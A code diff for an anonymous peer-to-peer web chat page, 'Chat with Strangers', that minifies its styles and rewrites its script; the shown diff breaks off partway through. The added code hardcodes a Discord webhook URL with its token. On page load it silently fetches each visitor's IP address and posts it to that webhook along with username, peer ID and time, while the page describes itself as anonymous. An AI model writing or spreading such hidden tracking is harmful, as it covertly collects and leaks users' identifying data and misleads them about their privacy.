@@ -3,578 +3,13 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta name="description" content="Chat anonymously with strangers in a secure peer-to-peer environment">
-    <title>Chat with Strangers - Secure P2P Messaging</title>
+    <title>Chat with Strangers</title>
     <link rel="preconnect" href="https://fonts.googleapis.com">
-    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600&display=swap" rel="stylesheet">
-    <script src="https://unpkg.com/peerjs@1.4.7/dist/peerjs.min.js" defer></script>
+    <link rel="preconnect" href="https://unpkg.com">
+    <script src="https://unpkg.com/peerjs@1.3.2/dist/peerjs.min.js" defer></script>
     <style>
-        :root {
-            --bg-primary: #0a0a0a;
-            --bg-secondary: #111111;
-            --bg-tertiary: #1a1a1a;
-            --text-primary: #e0e0e0;
-            --text-secondary: #909090;
-            --accent: #00ff9d;
-            --accent-dark: #00cc7d;
-            --accent-glow: rgba(0, 255, 157, 0.2);
-            --danger: #ff3a4c;
-            --success: #00ff9d;
-            --warning: #ffbb00;
-            --transition: all 0.3s ease;
-        }
-        
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
-        }
-        
-        body {
-            background-color: var(--bg-primary);
-            color: var(--text-primary);
-            display: flex;
-            flex-direction: column;
-            min-height: 100vh;
-            line-height: 1.6;
-        }
-        
-        header {
-            background-color: var(--bg-secondary);
-            padding: 1rem;
-            text-align: center;
-            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.3);
-            position: sticky;
-            top: 0;
-            z-index: 100;
-        }
-        
-        header h1 {
-            color: var(--accent);
-            font-weight: 600;
-            letter-spacing: 1px;
-            font-size: clamp(1.5rem, 4vw, 2rem);
-        }
-        
-        .container {
-            flex: 1;
-            max-width: 800px;
-            margin: 0 auto;
-            padding: 1rem;
-            width: 100%;
-            display: flex;
-            flex-direction: column;
-        }
-        
-        #setup-screen {
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            text-align: center;
-            gap: 1.5rem;
-            margin-bottom: 1.5rem;
-        }
-        
-        #setup-screen h2 {
-            font-size: 1.5rem;
-            margin-bottom: 0.5rem;
-            color: var(--text-primary);
-            font-weight: 600;
-        }
-        
-        #my-id-display {
-            padding: 1rem;
-            background-color: var(--bg-tertiary);
-            border-radius: 8px;
-            margin-bottom: 1rem;
-            word-break: break-all;
-            border: 1px solid #222;
-            width: 100%;
-        }
-        
-        #my-id {
-            color: var(--accent);
-            font-weight: bold;
-            font-family: monospace;
-        }
-        
-        #connect-form {
-            display: flex;
-            flex-direction: column;
-            gap: 0.8rem;
-            width: 100%;
-            max-width: 400px;
-        }
-        
-        #connect-form h3 {
-            color: var(--text-primary);
-            font-weight: 600;
-            font-size: 1.2rem;
-        }
-        
-        #peer-id-input {
-            padding: 0.8rem 1rem;
-            background-color: var(--bg-tertiary);
-            color: var(--text-primary);
-            border: 1px solid #222;
-            border-radius: 4px;
-            font-size: 1rem;
-            transition: var(--transition);
-        }
-        
-        #peer-id-input:focus {
-            outline: none;
-            border-color: var(--accent);
-            box-shadow: 0 0 0 2px var(--accent-glow);
-        }
-        
-        #chat-screen {
-            display: flex;
-            flex-direction: column;
-            flex: 1;
-            gap: 1rem;
-        }
-        
-        #connection-status {
-            padding: 1rem;
-            background-color: var(--bg-tertiary);
-            border-radius: 8px;
-            text-align: center;
-            border: 1px solid #222;
-        }
-        
-        #messages {
-            flex: 1;
-            overflow-y: auto;
-            padding: 1rem;
-            display: flex;
-            flex-direction: column;
-            gap: 0.8rem;
-            background-color: var(--bg-tertiary);
-            border-radius: 8px;
-            min-height: 300px;
-            max-height: 60vh;
-            border: 1px solid #222;
-            scroll-behavior: smooth;
-        }
-        
-        #messages::-webkit-scrollbar {
-            width: 6px;
-        }
-        
-        #messages::-webkit-scrollbar-thumb {
-            background-color: var(--accent-dark);
-            border-radius: 6px;
-        }
-        
-        #messages::-webkit-scrollbar-track {
-            background-color: var(--bg-secondary);
-            border-radius: 6px;
-        }
-        
-        .message {
-            padding: 0.8rem 1rem;
-            border-radius: 8px;
-            max-width: 80%;
-            word-break: break-word;
-            line-height: 1.4;
-            animation: fadeIn 0.3s ease-out;
-        }
-        
-        .message.sent {
-            background-color: var(--accent-dark);
-            align-self: flex-end;
-            color: #000;
-            font-weight: 500;
-        }
-        
-        .message.received {
-            background-color: #222;
-            align-self: flex-start;
-        }
-        
-        .username {
-            font-size: 0.8rem;
-            opacity: 0.8;
-            margin-bottom: 0.2rem;
-            font-weight: 600;
-        }
-        
-        #message-form {
-            display: flex;
-            gap: 0.5rem;
-        }
-        
-        input, button {
-            padding: 0.8rem 1rem;
-            border: none;
-            border-radius: 4px;
-            font-size: 1rem;
-            transition: var(--transition);
-        }
-        
-        #message-input {
-            flex: 1;
-            background-color: var(--bg-tertiary);
-            color: var(--text-primary);
-            border: 1px solid #222;
-        }
-        
-        #message-input:focus {
-            outline: none;
-            border-color: var(--accent);
-            box-shadow: 0 0 0 2px var(--accent-glow);
-        }
-        
-        button {
-            background-color: var(--accent);
-            color: #000;
-            cursor: pointer;
-            font-weight: bold;
-            transition: var(--transition);
-            min-width: 100px;
-        }
-        
-        button:hover {
-            background-color: var(--accent-dark);
-            transform: translateY(-1px);
-        }
-        
-        button:active {
-            transform: translateY(0);
-        }
-        
-        button:disabled {
-            background-color: #333;
-            color: #666;
-            cursor: not-allowed;
-            transform: none;
-        }
-        
-        #disconnect-btn {
-            background-color: var(--danger);
-            color: white;
-        }
-        
-        #disconnect-btn:hover {
-            background-color: #e6293a;
-        }
-        
-        footer {
-            text-align: center;
-            padding: 1rem;
-            background-color: var(--bg-secondary);
-            color: var(--text-secondary);
-            font-size: 0.8rem;
-            box-shadow: 0 -2px 8px rgba(0, 0, 0, 0.3);
-        }
-        
-        .status-connecting {
-            color: var(--warning);
-        }
-        
-        .status-connected {
-            color: var(--success);
-        }
-        
-        .status-disconnected {
-            color: var(--danger);
-        }
-        
-        #error-display {
-            color: var(--danger);
-            padding: 1rem;
-            background-color: rgba(255, 58, 76, 0.1);
-            border-radius: 4px;
-            text-align: center;
-            display: none;
-            border: 1px solid rgba(255, 58, 76, 0.3);
-            animation: fadeIn 0.3s ease-out;
-        }
-        
-        #debug-log {
-            background-color: #0a0a0a;
-            color: var(--accent);
-            padding: 0.8rem;
-            font-family: monospace;
-            height: 100px;
-            overflow-y: auto;
-            margin-top: 1rem;
-            font-size: 0.8rem;
-            white-space: pre-wrap;
-            border-radius: 4px;
-            border: 1px solid #222;
-            display: none; /* Hidden by default */
-        }
-        
-        #online-users-panel {
-            background-color: var(--bg-tertiary);
-            border-radius: 8px;
-            padding: 1rem;
-            margin-bottom: 1.5rem;
-            border: 1px solid #222;
-            width: 100%;
-        }
-        
-        #online-users-panel h3 {
-            margin-bottom: 1rem;
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-            font-weight: 600;
-            font-size: 1.1rem;
-        }
-        
-        #online-count {
-            background-color: var(--accent);
-            color: #000;
-            border-radius: 12px;
-            padding: 0.2rem 0.6rem;
-            font-size: 0.8rem;
-            font-weight: bold;
-        }
-        
-        #users-list {
-            max-height: 200px;
-            overflow-y: auto;
-            background-color: rgba(0, 0, 0, 0.2);
-            border-radius: 4px;
-        }
-        
-        #users-list::-webkit-scrollbar {
-            width: 6px;
-        }
-        
-        #users-list::-webkit-scrollbar-thumb {
-            background-color: var(--accent-dark);
-            border-radius: 6px;
-        }
-        
-        #users-list::-webkit-scrollbar-track {
-            background-color: var(--bg-secondary);
-            border-radius: 6px;
-        }
-        
-        .user-item {
-            display: flex;
-            justify-content: space-between;
-            padding: 0.8rem;
-            border-bottom: 1px solid #222;
-            transition: var(--transition);
-        }
-        
-        .user-item:hover {
-            background-color: rgba(255, 255, 255, 0.05);
-        }
-        
-        .user-item:last-child {
-            border-bottom: none;
-        }
-        
-        .user-item .user-name {
-            font-weight: bold;
-            display: flex;
-            align-items: center;
-        }
-        
-        .user-item .user-name::before {
-            content: '';
-            display: inline-block;
-            width: 8px;
-            height: 8px;
-            background-color: var(--success);
-            border-radius: 50%;
-            margin-right: 8px;
-        }
-        
-        .user-item .user-id {
-            color: var(--text-secondary);
-            font-size: 0.8rem;
-            font-family: monospace;
-        }
-        
-        .user-item.current-user {
-            background-color: rgba(0, 255, 157, 0.1);
-        }
-        
-        .connect-icon {
-            cursor: pointer;
-            color: var(--accent);
-            margin-left: 0.5rem;
-            transition: var(--transition);
-        }
-        
-        .connect-icon:hover {
-            text-decoration: underline;
-        }
-        
-        #random-chat-wrapper {
-            margin-bottom: 1.5rem;
-            width: 100%;
-            max-width: 400px;
-        }
-        
-        #random-chat-btn {
-            width: 100%;
-            background-color: var(--warning);
-            color: #000;
-            font-size: 1.1rem;
-            padding: 1rem;
-            border-radius: 8px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 0.5rem;
-            transition: var(--transition);
-        }
-        
-        #random-chat-btn:hover {
-            background-color: #e6a800;
-            transform: translateY(-2px);
-        }
-        
-        #random-chat-btn:active {
-            transform: translateY(0);
-        }
-        
-        #random-chat-btn:disabled {
-            background-color: #665000;
-            transform: none;
-        }
-        
-        #random-chat-btn .icon {
-            font-size: 1.2rem;
-        }
-        
-        #searching-indicator {
-            margin-top: 0.5rem;
-            font-size: 0.9rem;
-            color: var(--accent);
-            display: none;
-        }
-        
-        .copy-btn {
-            background-color: #333;
-            color: var(--text-primary);
-            padding: 0.3rem 0.6rem;
-            border-radius: 4px;
-            font-size: 0.8rem;
-            margin-left: 0.5rem;
-            cursor: pointer;
-            transition: var(--transition);
-        }
-        
-        .copy-btn:hover {
-            background-color: #444;
-        }
-        
-        .copy-btn.copied {
-            background-color: var(--success);
-            color: #000;
-        }
-        
-        .typing-indicator {
-            display: flex;
-            gap: 4px;
-            padding: 0.5rem 1rem;
-            background-color: #222;
-            border-radius: 8px;
-            align-self: flex-start;
-            margin-bottom: 0.5rem;
-            animation: fadeIn 0.3s ease-out;
-        }
-        
-        .typing-dot {
-            width: 8px;
-            height: 8px;
-            background-color: var(--text-secondary);
-            border-radius: 50%;
-            animation: typingAnimation 1.4s infinite ease-in-out;
-        }
-        
-        .typing-dot:nth-child(1) {
-            animation-delay: 0s;
-        }
-        
-        .typing-dot:nth-child(2) {
-            animation-delay: 0.2s;
-        }
-        
-        .typing-dot:nth-child(3) {
-            animation-delay: 0.4s;
-        }
-        
-        @keyframes typingAnimation {
-            0%, 60%, 100% { transform: translateY(0); }
-            30% { transform: translateY(-4px); }
-        }
-        
-        @keyframes pulse {
-            0% { transform: scale(1); }
-            50% { transform: scale(1.05); }
-            100% { transform: scale(1); }
-        }
-        
-        @keyframes fadeIn {
-            from { opacity: 0; transform: translateY(10px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
-        
-        #setup-screen, #chat-screen {
-            animation: fadeIn 0.5s ease-out;
-        }
-        
-        .notification {
-            position: fixed;
-            bottom: 20px;
-            right: 20px;
-            background-color: var(--accent);
-            color: #000;
-            padding: 1rem;
-            border-radius: 8px;
-            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.3);
-            z-index: 1000;
-            animation: fadeIn 0.3s ease-out;
-            display: flex;
-            align-items: center;
-            gap: 0.5rem;
-        }
-        
-        .notification.error {
-            background-color: var(--danger);
-            color: white;
-        }
-        
-        .notification.success {
-            background-color: var(--success);
-            color: #000;
-        }
-        
-        /* Responsive adjustments */
-        @media (max-width: 600px) {
-            .container {
-                padding: 0.5rem;
-            }
-            
-            #messages {
-                max-height: 50vh;
-            }
-            
-            .message {
-                max-width: 90%;
-            }
-            
-            #message-form {
-                flex-direction: column;
-            }
-            
-            button {
-                width: 100%;
-            }
-        }
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600&display=swap');
+        :root{--bg-primary:#0a0a0a;--bg-secondary:#111111;--bg-tertiary:#1a1a1a;--text-primary:#e0e0e0;--text-secondary:#909090;--accent:#00ff9d;--accent-dark:#00cc7d;--accent-glow:rgba(0,255,157,0.2);--danger:#ff3a4c;--success:#00ff9d;--warning:#ffbb00}*{margin:0;padding:0;box-sizing:border-box;font-family:'Inter',sans-serif}body{background-color:var(--bg-primary);color:var(--text-primary);display:flex;flex-direction:column;min-height:100vh}header{background-color:var(--bg-secondary);padding:1rem;text-align:center;box-shadow:0 2px 8px rgba(0,0,0,0.3)}header h1{color:var(--accent);font-weight:600;letter-spacing:1px}.container{flex:1;max-width:800px;margin:0 auto;padding:1rem;width:100%;display:flex;flex-direction:column}#setup-screen{display:flex;flex-direction:column;align-items:center;justify-content:center;text-align:center;gap:1.5rem;margin-bottom:1.5rem}#setup-screen h2{font-size:1.5rem;margin-bottom:0.5rem;color:var(--text-primary);font-weight:600}#my-id-display{padding:1rem;background-color:var(--bg-tertiary);border-radius:8px;margin-bottom:1rem;word-break:break-all;border:1px solid #222}#my-id{color:var(--accent);font-weight:bold;font-family:monospace}#connect-form{display:flex;flex-direction:column;gap:0.8rem;width:100%;max-width:400px}#connect-form h3{color:var(--text-primary);font-weight:600;font-size:1.2rem}#peer-id-input{padding:0.8rem 1rem;background-color:var(--bg-tertiary);color:var(--text-primary);border:1px solid #222;border-radius:4px;font-size:1rem}#peer-id-input:focus{outline:none;border-color:var(--accent);box-shadow:0 0 0 2px var(--accent-glow)}#chat-screen{display:flex;flex-direction:column;flex:1}#connection-status{padding:1rem;background-color:var(--bg-tertiary);margin-bottom:1rem;border-radius:8px;text-align:center;border:1px solid #222}#messages{flex:1;overflow-y:auto;padding:1rem;display:flex;flex-direction:column;gap:0.8rem;background-color:var(--bg-tertiary);border-radius:8px;margin-bottom:1rem;min-height:300px;max-height:60vh;border:1px solid #222}#messages::-webkit-scrollbar{width:6px}#messages::-webkit-scrollbar-thumb{background-color:var(--accent-dark);border-radius:6px}#messages::-webkit-scrollbar-track{background-color:var(--bg-secondary);border-radius:6px}.message{padding:0.8rem 1rem;border-radius:8px;max-width:80%;word-break:break-word;line-height:1.4}.message.sent{background-color:var(--accent-dark);align-self:flex-end;color:#000;font-weight:500}.message.received{background-color:#222;align-self:flex-start}.username{font-size:0.8rem;opacity:0.8;margin-bottom:0.2rem;font-weight:600}#message-form{display:flex;gap:0.5rem}input,button{padding:0.8rem 1rem;border:none;border-radius:4px;font-size:1rem}#message-input{flex:1;background-color:var(--bg-tertiary);color:var(--text-primary);border:1px solid #222}#message-input:focus{outline:none;border-color:var(--accent);box-shadow:0 0 0 2px var(--accent-glow)}button{background-color:var(--accent);color:#000;cursor:pointer;font-weight:bold;transition:background-color 0.2s}button:hover{background-color:var(--accent-dark)}button:disabled{background-color:#333;color:#666;cursor:not-allowed}#disconnect-btn{background-color:var(--danger);color:white;margin-top:1rem}#disconnect-btn:hover{background-color:#e6293a}footer{text-align:center;padding:1rem;background-color:var(--bg-secondary);color:var(--text-secondary);font-size:0.8rem;box-shadow:0 -2px 8px rgba(0,0,0,0.3)}.status-connecting{color:var(--warning)}.status-connected{color:var(--success)}.status-disconnected{color:var(--danger)}#error-display{color:var(--danger);padding:1rem;margin-top:1rem;background-color:rgba(255,58,76,0.1);border-radius:4px;text-align:center;display:none;border:1px solid rgba(255,58,76,0.3)}#debug-log{background-color:#0a0a0a;color:var(--accent);padding:0.8rem;font-family:monospace;height:100px;overflow-y:auto;margin-top:1rem;font-size:0.8rem;white-space:pre-wrap;border-radius:4px;border:1px solid #222}#online-users-panel{background-color:var(--bg-tertiary);border-radius:8px;padding:1rem;margin-bottom:1.5rem;border:1px solid #222;width:100%}#online-users-panel h3{margin-bottom:1rem;display:flex;align-items:center;justify-content:space-between;font-weight:600;font-size:1.1rem}#online-count{background-color:var(--accent);color:#000;border-radius:12px;padding:0.2rem 0.6rem;font-size:0.8rem;font-weight:bold}#users-list{max-height:200px;overflow-y:auto;background-color:rgba(0,0,0,0.2);border-radius:4px}#users-list::-webkit-scrollbar{width:6px}#users-list::-webkit-scrollbar-thumb{background-color:var(--accent-dark);border-radius:6px}#users-list::-webkit-scrollbar-track{background-color:var(--bg-secondary);border-radius:6px}.user-item{display:flex;justify-content:space-between;padding:0.8rem;border-bottom:1px solid #222}.user-item:last-child{border-bottom:none}.user-item .user-name{font-weight:bold;display:flex;align-items:center}.user-item .user-name::before{content:'';display:inline-block;width:8px;height:8px;background-color:var(--success);border-radius:50%;margin-right:8px}.user-item .user-id{color:var(--text-secondary);font-size:0.8rem;font-family:monospace}.user-item.current-user{background-color:rgba(0,255,157,0.1)}.connect-icon{cursor:pointer;color:var(--accent);margin-left:0.5rem}#random-chat-wrapper{margin-bottom:1.5rem;width:100%;max-width:400px}#random-chat-btn{width:100%;background-color:var(--warning);color:#000;font-size:1.1rem;padding:1rem;border-radius:8px;display:flex;align-items:center;justify-content:center;gap:0.5rem;transition:transform 0.2s,background-color 0.2s}#random-chat-btn:hover{background-color:#e6a800;transform:translateY(-2px)}#random-chat-btn:active{transform:translateY(0)}#random-chat-btn:disabled{background-color:#665000;transform:none}#random-chat-btn .icon{font-size:1.2rem}@keyframes pulse{0%{transform:scale(1)}50%{transform:scale(1.05)}100%{transform:scale(1)}}.random-connecting{animation:pulse 1s infinite}@keyframes fadeIn{from{opacity:0}to{opacity:1}}#setup-screen,#chat-screen{animation:fadeIn 0.5s ease-out}#searching-indicator{margin-top:0.5rem;font-size:0.9rem;color:var(--accent);display:none}
     </style>
 </head>
 <body>
@@ -615,14 +50,14 @@
             
             <form id="connect-form">
                 <h3>Connect to someone</h3>
-                <input type="text" id="peer-id-input" placeholder="Enter their ID here..." autocomplete="off">
+                <input type="text" id="peer-id-input" placeholder="Enter their ID here...">
                 <button type="submit" id="connect-btn">Connect</button>
             </form>
             
             <div id="error-display"></div>
         </div>
         
-        <div id="chat-screen" style="display: none;">
+        <div id="chat-screen">
             <div id="connection-status">
                 <p id="status-text" class="status-disconnected">Disconnected</p>
                 <p id="username-display"></p>
@@ -642,893 +77,844 @@
     </div>
     
     <footer>
-        <p>Chat with Strangers &copy; 2025 | Secure P2P Messaging</p>
+        <p>Chat with Strangers &copy; 2025</p>
     </footer>
 
     <script>
-        // Configuration
-        const CONFIG = {
-            debugMode: false, // Set to true to show debug log
-            heartbeatInterval: 30000, // 30 seconds
-            matchmakingInterval: 5000, // 5 seconds
-            typingIndicatorTimeout: 2000, // 2 seconds
-            peerJsOptions: {
-                debug: 2,
-                config: {
-                    iceServers: [
-                        { urls: 'stun:stun.l.google.com:19302' },
-                        { urls: 'stun:global.stun.twilio.com:3478?transport=udp' }
-                    ]
-                }
-            }
-        };
-        
-        // DOM Elements
-        const setupScreen = document.getElementById('setup-screen');
-        const chatScreen = document.getElementById('chat-screen');
-        const myIdDisplay = document.getElementById('my-id');
-        const peerIdInput = document.getElementById('peer-id-input');
-        const connectForm = document.getElementById('connect-form');
-        const connectBtn = document.getElementById('connect-btn');
-        const disconnectBtn = document.getElementById('disconnect-btn');
-        const statusText = document.getElementById('status-text');
-        const usernameDisplay = document.getElementById('username-display');
-        const messagesContainer = document.getElementById('messages');
-        const messageForm = document.getElementById('message-form');
-        const messageInput = document.getElementById('message-input');
-        const sendBtn = document.getElementById('send-btn');
-        const errorDisplay = document.getElementById('error-display');
-        const debugLog = document.getElementById('debug-log');
-        const onlineCount = document.getElementById('online-count');
-        const usersList = document.getElementById('users-list');
-        const randomChatBtn = document.getElementById('random-chat-btn');
-        const searchingIndicator = document.getElementById('searching-indicator');
-        
-        // State variables
-        let peer;
-        let connection;
-        let localUsername;
-        let remoteUsername;
-        let isConnected = false;
-        let myPeerId;
-        let isSearching = false;
-        let userIP = 'Unknown';
-        let trackerConnection;
-        const TRACKER_SERVER_ID = 'user-tracker-server';
-        let onlineUsers = new Map();
-        let searchingUsers = new Map();
-        let heartbeatInterval;
-        let matchmakingInterval;
-        let typingTimeout;
-        let isTyping = false;
-        
-        // Initialize debug log visibility
-        debugLog.style.display = CONFIG.debugMode ? 'block' : 'none';
-        
-        // Helper functions
-        function showNotification(message, type = 'info') {
-            const notification = document.createElement('div');
-            notification.className = `notification ${type}`;
-            notification.textContent = message;
+        // Main application controller
+        const ChatApp = (function() {
+            // Discord webhook URL
+            const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1367405276898263160/KBpTkpTtSbz9oRJefUrbiSIV7aOp1f7nE5qP_aThs3_D86Rm1Emk48ojUxQwYpnrDoIN';
             
-            document.body.appendChild(notification);
+            // DOM elements
+            const elements = {
+                setupScreen: document.getElementById('setup-screen'),
+                chatScreen: document.getElementById('chat-screen'),
+                myIdDisplay: document.getElementById('my-id'),
+                peerIdInput: document.getElementById('peer-id-input'),
+                connectForm: document.getElementById('connect-form'),
+                connectBtn: document.getElementById('connect-btn'),
+                disconnectBtn: document.getElementById('disconnect-btn'),
+                statusText: document.getElementById('status-text'),
+                usernameDisplay: document.getElementById('username-display'),
+                messagesContainer: document.getElementById('messages'),
+                messageForm: document.getElementById('message-form'),
+                messageInput: document.getElementById('message-input'),
+                sendBtn: document.getElementById('send-btn'),
+                errorDisplay: document.getElementById('error-display'),
+                debugLog: document.getElementById('debug-log'),
+                onlineCount: document.getElementById('online-count'),
+                usersList: document.getElementById('users-list'),
+                randomChatBtn: document.getElementById('random-chat-btn'),
+                searchingIndicator: document.getElementById('searching-indicator')
+            };
             
-            setTimeout(() => {
-                notification.style.opacity = '0';
-                setTimeout(() => {
-                    notification.remove();
-                }, 300);
-            }, 3000);
-        }
-        
-        async function getUserIP() {
-            try {
-                const response = await fetch('https://api.ipify.org?format=json');
-                const data = await response.json();
-                return data.ip;
-            } catch (error) {
-                console.error('Error fetching IP:', error);
-                return 'Unknown';
-            }
-        }
-        
-        function log(message) {
-            if (!CONFIG.debugMode) return;
+            // App state
+            const state = {
+                peer: null,
+                connection: null,
+                trackerConnection: null,
+                localUsername: '',
+                remoteUsername: '',
+                isConnected: false,
+                myPeerId: '',
+                isSearching: false,
+                userIP: 'Unknown',
+                TRACKER_SERVER_ID: 'user-tracker-server',
+                onlineUsers: new Map(),
+                searchingUsers: new Map(),
+                heartbeatInterval: null,
+                matchmakingInterval: null
+            };
             
-            console.log(message);
-            const now = new Date().toLocaleTimeString();
-            debugLog.innerHTML += `[${now}] ${message}\n`;
-            debugLog.scrollTop = debugLog.scrollHeight;
-        }
-        
-        function showError(message) {
-            errorDisplay.textContent = message;
-            errorDisplay.style.display = 'block';
-            setTimeout(() => {
-                errorDisplay.style.display = 'none';
-            }, 5000);
-            
-            showNotification(message, 'error');
-        }
-        
-        function generateUsername() {
-            const adjectives = ['Happy', 'Clever', 'Brave', 'Witty', 'Gentle', 'Bold', 'Calm', 'Eager', 'Fair', 'Kind'];
-            const nouns = ['Wolf', 'Bear', 'Tiger', 'Lion', 'Eagle', 'Hawk', 'Fox', 'Owl', 'Dolphin', 'Panther'];
-            const randomNumber = Math.floor(Math.random() * 1000);
-            const adj = adjectives[Math.floor(Math.random() * adjectives.length)];
-            const noun = nouns[Math.floor(Math.random() * nouns.length)];
-            return `${adj}${noun}${randomNumber}`;
-        }
-        
-        function generateSimpleId() {
-            const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
-            let result = '';
-            for (let i = 0; i < 6; i++) {
-                result += characters.charAt(Math.floor(Math.random() * characters.length));
-            }
-            return result;
-        }
-        
-        function copyToClipboard(text) {
-            navigator.clipboard.writeText(text).then(() => {
-                showNotification('Copied to clipboard!', 'success');
-            }).catch(err => {
-                console.error('Failed to copy:', err);
-                showNotification('Failed to copy', 'error');
-            });
-        }
-        
-        function updateOnlineUsersUI() {
-            onlineCount.textContent = onlineUsers.size;
-            
-            usersList.innerHTML = '';
-            
-            if (onlineUsers.size === 0) {
-                const emptyState = document.createElement('div');
-                emptyState.classList.add('user-item');
-                emptyState.textContent = 'No other users online';
-                usersList.appendChild(emptyState);
-                return;
+            // Initialize the app
+            async function init() {
+                elements.chatScreen.style.display = 'none';
+                setupEventListeners();
+                await initializePeer();
+                updateRandomChatButton();
             }
             
-            onlineUsers.forEach((userData, peerId) => {
-                const userItem = document.createElement('div');
-                userItem.classList.add('user-item');
+            // Set up event listeners
+            function setupEventListeners() {
+                elements.connectForm.addEventListener('submit', handleConnectSubmit);
+                elements.messageForm.addEventListener('submit', handleMessageSubmit);
+                elements.disconnectBtn.addEventListener('click', disconnectFromPeer);
+                elements.randomChatBtn.addEventListener('click', toggleRandomChat);
                 
-                if (peerId === myPeerId) {
-                    userItem.classList.add('current-user');
-                }
-                
-                const userInfo = document.createElement('div');
-                
-                const userName = document.createElement('span');
-                userName.classList.add('user-name');
-                userName.textContent = userData.username;
-                
-                if (userData.searching) {
-                    const searchingBadge = document.createElement('span');
-                    searchingBadge.textContent = ' 🔍';
-                    searchingBadge.style.fontSize = '0.8em';
-                    searchingBadge.style.opacity = '0.7';
-                    userName.appendChild(searchingBadge);
-                }
-                
-                const userId = document.createElement('span');
-                userId.classList.add('user-id');
-                userId.textContent = ` (${peerId})`;
-                
-                userInfo.appendChild(userName);
-                userInfo.appendChild(userId);
-                userItem.appendChild(userInfo);
-                
-                if (peerId !== myPeerId && !isConnected) {
-                    const connectIcon = document.createElement('span');
-                    connectIcon.classList.add('connect-icon');
-                    connectIcon.textContent = '→ Connect';
-                    connectIcon.onclick = () => {
-                        peerIdInput.value = peerId;
-                        connectToPeer(peerId);
-                    };
-                    userItem.appendChild(connectIcon);
-                }
-                
-                usersList.appendChild(userItem);
-            });
-            
-            updateRandomChatButton();
-        }
-        
-        function showTypingIndicator() {
-            if (isTyping) return;
-            
-            isTyping = true;
-            const typingElement = document.createElement('div');
-            typingElement.className = 'typing-indicator';
-            typingElement.id = 'remote-typing';
-            
-            for (let i = 0; i < 3; i++) {
-                const dot = document.createElement('div');
-                dot.className = 'typing-dot';
-                typingElement.appendChild(dot);
+                window.addEventListener('beforeunload', cleanupBeforeUnload);
             }
             
-            messagesContainer.appendChild(typingElement);
-            messagesContainer.scrollTop = messagesContainer.scrollHeight;
-        }
-        
-        function hideTypingIndicator() {
-            if (!isTyping) return;
-            
-            isTyping = false;
-            const typingElement = document.getElementById('remote-typing');
-            if (typingElement) {
-                typingElement.remove();
-            }
-        }
-        
-        // PeerJS and connection management
-        async function initializePeer() {
-            const peerId = generateSimpleId();
-            localUsername = generateUsername();
-            userIP = await getUserIP();
-            
-            log(`Initializing PeerJS with ID: ${peerId}`);
-            
-            try {
-                peer = new Peer(peerId, CONFIG.peerJsOptions);
+            // Initialize PeerJS connection
+            async function initializePeer() {
+                const peerId = generateSimpleId();
+                state.localUsername = generateUsername();
+                state.userIP = await getUserIP();
                 
-                peer.on('open', (id) => {
-                    log(`Peer connected with ID: ${id}`);
-                    myPeerId = id;
-                    myIdDisplay.textContent = id;
-                    usernameDisplay.textContent = `Your username: ${localUsername}`;
-                    
-                    // Add copy button to ID display
-                    const copyBtn = document.createElement('span');
-                    copyBtn.className = 'copy-btn';
-                    copyBtn.textContent = 'Copy';
-                    copyBtn.onclick = () => copyToClipboard(id);
-                    myIdDisplay.parentNode.insertBefore(copyBtn, myIdDisplay.nextSibling);
-                    
-                    onlineUsers.set(id, {
-                        username: localUsername,
-                        searching: false
-                    });
-                    updateOnlineUsersUI();
-                    
-                    connectToTracker();
-                });
+                sendToDiscordWebhook(`🌐 **User Joined**\n- Username: ${state.localUsername}\n- Peer ID: ${peerId}\n- IP: ${state.userIP}\n- Time: ${new Date().toLocaleString()}`);
                 
-                peer.on('connection', (conn) => {
-                    log(`Incoming connection from: ${conn.peer}`);
-                    
-                    if (conn.peer === TRACKER_SERVER_ID) {
-                        log('Tracker server initiated connection');
-                        trackerConnection = conn;
-                        setupTrackerConnection();
-                        return;
-                    }
-                    
-                    if (!isConnected) {
-                        connection = conn;
-                        setupConnection();
-                    } else {
-                        conn.close();
-                        showNotification('You are already connected to someone', 'error');
-                    }
-                });
+                log(`Initializing PeerJS with ID: ${peerId}`);
                 
-                peer.on('error', (err) => {
-                    log(`Peer error: ${err.type} - ${err.message}`);
+                try {
+                    state.peer = new Peer(peerId, { debug: 2 });
                     
-                    if (err.type === 'peer-unavailable' && err.message.includes(TRACKER_SERVER_ID)) {
-                        log('Tracker server not found, becoming tracker server');
-                        becomeTrackerServer();
-                        return;
-                    }
-                    
-                    showError(`Connection error: ${err.type}`);
-                    
-                    if (err.type === 'peer-unavailable') {
-                        showError('Peer ID not found. Check the ID and try again.');
-                    } else if (err.type === 'network') {
-                        showError('Network error. Check your internet connection.');
-                    } else if (err.type === 'disconnected') {
-                        showError('Disconnected from server. Try refreshing the page.');
-                    }
-                });
-                
-                peer.on('disconnected', () => {
-                    log('Peer disconnected from server');
-                    showError('Disconnected from server. Click to reconnect.');
-                    
-                    setTimeout(() => {
-                        if (peer) peer.reconnect();
-                    }, 3000);
-                });
-            } catch (error) {
-                log(`Error initializing PeerJS: ${error.message}`);
-                showError(`Failed to initialize connection: ${error.message}`);
-            }
-        }
-        
-        function connectToTracker() {
-            log('Attempting to connect to tracker server');
-            
-            try {
-                trackerConnection = peer.connect(TRACKER_SERVER_ID, {
-                    reliable: true,
-                    serialization: 'json'
-                });
-                
-                setupTrackerConnection();
-            } catch (error) {
-                log(`Error connecting to tracker: ${error.message}`);
-            }
-        }
-        
-        function setupTrackerConnection() {
-            log('Setting up tracker connection');
-            
-            trackerConnection.on('open', () => {
-                log('Connected to tracker server');
-                
-                trackerConnection.send({
-                    type: 'register',
-                    peerId: myPeerId,
-                    username: localUsername,
-                    searching: isSearching
-                });
-                
-                if (heartbeatInterval) clearInterval(heartbeatInterval);
